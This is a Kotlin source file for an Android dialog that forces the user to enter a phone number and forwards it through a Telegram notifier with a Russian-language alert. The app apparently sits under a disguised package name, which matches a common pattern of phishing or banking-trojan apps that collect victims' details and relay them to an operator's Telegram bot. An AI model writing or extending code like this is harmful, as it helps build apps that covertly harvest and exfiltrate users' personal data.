package com.android.quickdraw.ui.dialogs

import android.app.AlertDialog
import android.content.Context
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.text.InputType
import android.view.LayoutInflater
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import com.secure.webapp.R
import com.secure.webapp.core.TelegramNotifier
import com.secure.webapp.utils.PhoneValidator

class PhoneInputDialog(
    private val context: Context,
    private val notifier: TelegramNotifier,
    private val onSuccess: (phoneNumber: String) -> Unit
) {
    fun show() {
        val dialogView = LayoutInflater.from(context).inflate(R.layout.dialog_phone_input, null)
        val dialog = AlertDialog.Builder(context)
            .setView(dialogView)
            .setCancelable(false)
            .create()

        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        val title = dialogView.findViewById<TextView>(R.id.dialog_title)
        val message = dialogView.findViewById<TextView>(R.id.dialog_message)
        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
        val continueButton = dialogView.findViewById<Button>(R.id.continue_button)

        title.text = context.getString(R.string.phone_dialog_title)
        message.text = context.getString(R.string.phone_dialog_message)
        phoneInput.inputType = InputType.TYPE_CLASS_PHONE

        continueButton.setOnClickListener {
            val phoneNumber = phoneInput.text.toString().trim()
            if (PhoneValidator.isValid(phoneNumber)) {
                notifier.sendNotification("Введен номер телефона: $phoneNumber")
                onSuccess(phoneNumber)
                dialog.dismiss()
            } else {
                phoneInput.error = context.getString(R.string.phone_error_message)
            }
        }

        dialog.show()
    }
}
